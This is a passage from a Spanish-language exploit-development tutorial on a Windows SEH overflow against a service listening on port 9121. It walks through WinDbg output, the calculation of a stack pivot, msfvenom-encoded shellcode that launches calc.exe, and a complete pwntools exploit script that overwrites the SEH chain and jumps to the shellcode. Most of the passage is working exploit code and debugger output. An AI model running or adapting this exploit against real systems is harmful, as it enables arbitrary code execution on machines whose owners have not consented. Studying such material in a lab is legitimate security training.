<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">!teb
TEB at 0037e000
    ExceptionList:        01c0f3fc
    StackBase:            01c10000
    StackLimit:           01c0e000
    SubSystemTib:         00000000
    FiberData:            00001e00
    ArbitraryUserPointer: 00000000
    Self:                 0037e000
    EnvironmentPointer:   00000000
    ClientId:             00001adc . 00000918
    RpcHandle:            00000000
    Tls Storage:          005dbc20
    PEB Address:          0035a000
    LastErrorValue:       0
    LastStatusValue:      c000000d
    Count Owned Locks:    0
    HardErrorMode:        0</span>
</code></pre></div></div><br>

<p class="plain-text">Ya que es probable que encontremos la cadena en algún lugar del stack podemos buscar los bytes del del siguiente SEH que son <code class="language-plaintext highlighter-rouge">eb 06 41 41</code> que aparece 2 veces, si sumamos los <code class="language-plaintext highlighter-rouge">8</code> bytes para saltar la estructura tenemos la dirección de las <code class="language-plaintext highlighter-rouge">D's</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">s -b 01c0e000 01c10000 eb 06 41 41
01c0fa88  eb 06 41 41 dc 2e 13 10-44 44 44 44 44 44 44 44  ..AA....DDDDDDDD
01c0ff4c  eb 06 41 41 dc 2e 13 10-44 44 44 44 44 44 44 44  ..AA....DDDDDDDD

</span><span class="ro">0:000> </span><span class="p">? 01c0fa88 - esp + 8
Evaluate expression: 1692 = 0000069c</span>
</code></pre></div></div><br>

<p class="plain-text">Nuestro exploit se podría ver asi, sumando a <code class="language-plaintext highlighter-rouge">esp</code> la diferencia con la dirección donde están las <code class="language-plaintext highlighter-rouge">D's</code> para despues saltar a ellas, sin embargo nos olvidamos de algo importante que es el <code class="language-plaintext highlighter-rouge">tamaño</code> de estas instrucciones y el alineamiento de la pila.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
payload </span><span class="o">+= </span><span class="p">junk
payload </span><span class="o">+= </span><span class="p">nseh </span><span class="o">+ </span><span class="p">seh
payload </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"add sp, 0x69c"</span><span class="p">)
payload </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"jmp esp"</span><span class="p">)
payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"D" </span><span class="o">* </span><span class="p">(</span><span class="mi">1000</span><span class="o"> - </span><span class="no">len</span><span class="p">(payload))</span>
</code></pre></div></div><br>

<p class="plain-text">El tamaño de el <code class="language-plaintext highlighter-rouge">add</code> y el <code class="language-plaintext highlighter-rouge">jmp</code> es de <code class="language-plaintext highlighter-rouge">7</code> bytes, pero para evitar problemas con el alineamiento del stack usaremos un número divisible entre 4, podemos solo agregar un <code class="language-plaintext highlighter-rouge">nop</code> y ahora el tamaño es de <code class="language-plaintext highlighter-rouge">8</code> bytes que si es divisible entre los <code class="language-plaintext highlighter-rouge">4</code> bytes.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">-q
>>> from pwn import asm
>>> len(asm("add sp, 0x69c") + asm("jmp esp"))  
7
>>> len(asm("add sp, 0x69c") + asm("jmp esp") + asm("nop"))
8
>>> </span>
</code></pre></div></div><br>

<p class="plain-text">Entonces al tamaño que teniamos le agregamos <code class="language-plaintext highlighter-rouge">8</code> bytes que es el tamaño de las instrucciones y nos queda <code class="language-plaintext highlighter-rouge">0x6a4</code> que será la diferencia entre el <code class="language-plaintext highlighter-rouge">esp</code> y las <code class="language-plaintext highlighter-rouge">D's</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">? 0x69c + 8
Evaluate expression: 1700 = 000006a4</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
payload </span><span class="o">+= </span><span class="p">junk
payload </span><span class="o">+= </span><span class="p">nseh </span><span class="o">+ </span><span class="p">seh
payload </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"add sp, 0x6a4"</span><span class="p">)
payload </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"jmp esp"</span><span class="p">)
payload </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"nop"</span><span class="p">)
payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"D" </span><span class="o">* </span><span class="p">(</span><span class="mi">1000 </span><span class="o">- </span><span class="no">len</span><span class="p">(payload))</span>
</code></pre></div></div><br>

<p class="plain-text">Después de ejecutar el <code class="language-plaintext highlighter-rouge">add</code> sumando la diferencia ejecutará un <code class="language-plaintext highlighter-rouge">jmp esp</code> y como el esp apunta a donde están las <code class="language-plaintext highlighter-rouge">D's</code> las ejecutara como instrucciones ensamblador.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r
eax=00000000 ebx=77af8aa2 ecx=10132edc edx=77af8ac0 esi=00000000 edi=01c1f4e8
eip=01c1ff4c esp=01c1f3f4 ebp=01c1f408 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
01c1ff4c 6681c4a406      add     sp,6A4h

</span><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=77af8aa2 ecx=10132edc edx=77af8ac0 esi=00000000 edi=01c1f4e8
eip=01c1ff51 esp=01c1fa98 ebp=01c1f408 iopl=0         nv up ei ng nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282
01c1ff51 ffe4            jmp     esp {01c1fa98}</span>
</code></pre></div></div><br>

<p class="plain-text">Esta vez la cadena no se corta y tenemos un tamaño suficiente para un <code class="language-plaintext highlighter-rouge">shellcode</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">db esp L100
01c1fa98  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c1faa8  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c1fab8  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c1fac8  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c1fad8  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c1fae8  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c1faf8  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c1fb08  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c1fb18  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c1fb28  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c1fb38  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c1fb48  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c1fb58  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c1fb68  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c1fb78  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c1fb88  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD

</span><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=77af8aa2 ecx=10132edc edx=77af8ac0 esi=00000000 edi=01c1f4e8
eip=01c1fa98 esp=01c1fa98 ebp=01c1f408 iopl=0         nv up ei ng nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282
01c1fa98 44              inc     esp</span>
</code></pre></div></div><br>

</section>

<section class="post" id="commands">
<br><h3 class="post-title">Execute Commands</h3><br>

<p class="plain-text">Ya que tenemos una forma de ejecutar instrucciones podemos generar un shellcode usando <code class="language-plaintext highlighter-rouge">msfvenom</code> que en caso de interpretarse ejecutará el comando <code class="language-plaintext highlighter-rouge">calc.exe</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ msfvenom </span><span class="p">-p windows/exec CMD=calc.exe -f python -v shellcode -b </span><span class="am">'\x00\x02\x0a\x0d\xf8\xfd'</span><span class="p"> -e x86/jmp_call_additive
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/jmp_call_additive
x86/jmp_call_additive succeeded with size 225 (iteration=0)
x86/jmp_call_additive chosen with final size 225
Payload size: 225 bytes
Final size of python file: 1274 bytes
shellcode =  b""
shellcode += b"\xfc\xbb\x4b\x99\xd4\xef\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\xb7\x71\x56\xef\x47\x82\x37\x79"
shellcode += b"\xa2\xb3\x77\x1d\xa7\xe4\x47\x55\xe5\x08\x23"
shellcode += b"\x3b\x1d\x9a\x41\x94\x12\x2b\xef\xc2\x1d\xac"
shellcode += b"\x5c\x36\x3c\x2e\x9f\x6b\x9e\x0f\x50\x7e\xdf"
shellcode += b"\x48\x8d\x73\x8d\x01\xd9\x26\x21\x25\x97\xfa"
shellcode += b"\xca\x75\x39\x7b\x2f\xcd\x38\xaa\xfe\x45\x63"
shellcode += b"\x6c\x01\x89\x1f\x25\x19\xce\x1a\xff\x92\x24"
shellcode += b"\xd0\xfe\x72\x75\x19\xac\xbb\xb9\xe8\xac\xfc"
shellcode += b"\x7e\x13\xdb\xf4\x7c\xae\xdc\xc3\xff\x74\x68"
shellcode += b"\xd7\x58\xfe\xca\x33\x58\xd3\x8d\xb0\x56\x98"
shellcode += b"\xda\x9e\x7a\x1f\x0e\x95\x87\x94\xb1\x79\x0e"
shellcode += b"\xee\x95\x5d\x4a\xb4\xb4\xc4\x36\x1b\xc8\x16"
shellcode += b"\x99\xc4\x6c\x5d\x34\x10\x1d\x3c\x53\xe7\x93"
shellcode += b"\x3b\x11\xe7\xab\x43\x06\x80\x9a\xc8\xc9\xd7"
shellcode += b"\x22\x1b\xae\x28\x69\x01\x87\xa0\x34\xd0\x95"
shellcode += b"\xac\xc6\x0f\xd9\xc8\x44\xa5\xa2\x2e\x54\xcc"
shellcode += b"\xa7\x6b\xd2\x3d\xda\xe4\xb7\x41\x49\x04\x92"
shellcode += b"\x22\x0c\x96\x7e\x8a\xab\x1e\xe4\xd2\x33\xdf"
shellcode += b"\xe6\xd2\x33\xdf\xe6"</span>
</code></pre></div></div><br>

<p class="plain-text">Nuestro exploit final sobrescribe la estructura SEH para despues de ejecutar el gadget <code class="language-plaintext highlighter-rouge">pop; pop; ret;</code> y el <code class="language-plaintext highlighter-rouge">short jump</code> haga un stack pivot y salte al <code class="language-plaintext highlighter-rouge">shellcode</code> enviado.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32, asm

offset </span><span class="o">= </span><span class="mi">124</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset

nseh </span><span class="o">= </span><span class="p">asm(</span><span class="s">"jmp $+8"</span><span class="p">).ljust(</span><span class="mi">4</span><span class="p">, </span><span class="no">b</span><span class="s">"A"</span><span class="p">)
seh </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x10132edc</span><span class="p">)

shellcode </span><span class="o">=  </span><span class="no">b</span><span class="s">""</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xfc\xbb\x4b\x99\xd4\xef\xeb\x0c\x5e\x56\x31</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xff\xff\xff\xb7\x71\x56\xef\x47\x82\x37\x79</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xa2\xb3\x77\x1d\xa7\xe4\x47\x55\xe5\x08\x23</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x3b\x1d\x9a\x41\x94\x12\x2b\xef\xc2\x1d\xac</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x5c\x36\x3c\x2e\x9f\x6b\x9e\x0f\x50\x7e\xdf</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x48\x8d\x73\x8d\x01\xd9\x26\x21\x25\x97\xfa</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xca\x75\x39\x7b\x2f\xcd\x38\xaa\xfe\x45\x63</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x6c\x01\x89\x1f\x25\x19\xce\x1a\xff\x92\x24</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xd0\xfe\x72\x75\x19\xac\xbb\xb9\xe8\xac\xfc</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x7e\x13\xdb\xf4\x7c\xae\xdc\xc3\xff\x74\x68</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xd7\x58\xfe\xca\x33\x58\xd3\x8d\xb0\x56\x98</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xda\x9e\x7a\x1f\x0e\x95\x87\x94\xb1\x79\x0e</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xee\x95\x5d\x4a\xb4\xb4\xc4\x36\x1b\xc8\x16</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x99\xc4\x6c\x5d\x34\x10\x1d\x3c\x53\xe7\x93</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x3b\x11\xe7\xab\x43\x06\x80\x9a\xc8\xc9\xd7</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x22\x1b\xae\x28\x69\x01\x87\xa0\x34\xd0\x95</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xac\xc6\x0f\xd9\xc8\x44\xa5\xa2\x2e\x54\xcc</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xa7\x6b\xd2\x3d\xda\xe4\xb7\x41\x49\x04\x92</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x22\x0c\x96\x7e\x8a\xab\x1e\xe4\xd2\x33\xdf</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xe6\xd2\x33\xdf\xe6</span><span class="s">"</span><span class="p">

payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
payload </span><span class="o">+= </span><span class="p">junk
payload </span><span class="o">+= </span><span class="p">nseh </span><span class="o">+ </span><span class="p">seh
payload </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"add sp, 0x6a4"</span><span class="p">)
payload </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"jmp esp"</span><span class="p">)
payload </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"nop"</span><span class="p">)
payload </span><span class="o">+= </span><span class="p">shellcode
payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"D" </span><span class="o">* </span><span class="p">(</span><span class="mi">1000 </span><span class="o">- </span><span class="no">len</span><span class="p">(payload))

header  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0xabba1975</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0x3</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0x1</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="no">len</span><span class="p">(payload))
header </span><span class="o">+= </span><span class="p">p32(</span><span class="no">len</span><span class="p">(payload))
header </span><span class="o">+= </span><span class="p">p32(payload[</span><span class="o">-</span><span class="mi">1</span><span class="p">])

content </span><span class="o">= </span><span class="p">header </span><span class="o">+ </span><span class="p">payload

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"Windows"</span><span class="p">, </span><span class="mi">9121</span><span class="p">)
shell.sendline(content)</span>
</code></pre></div></div><br>

<p class="plain-text">Como resultado conseguimos controlar el programa y ejecutar el shellcode que ejecuta el comando <code class="language-plaintext highlighter-rouge">calc.exe</code> por lo que se abre una calculadora en la máquina.</p>
<a href="/exploit-development/windows-user/seh-overflow/5.png" target="_blank"><div><p><img src="/exploit-development/windows-user/seh-overflow/5.png"></p></div></a>

</section>

</article>
  </div>
  <footer class="footer">
    <span class="footer__copyright">&copy; 2024 - xchg2pwn</span>
  </footer><br><br>

<script type="text/javascript" src="/js/jquery.min.js"></script>
<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>

    </div>
  </body>
</html>
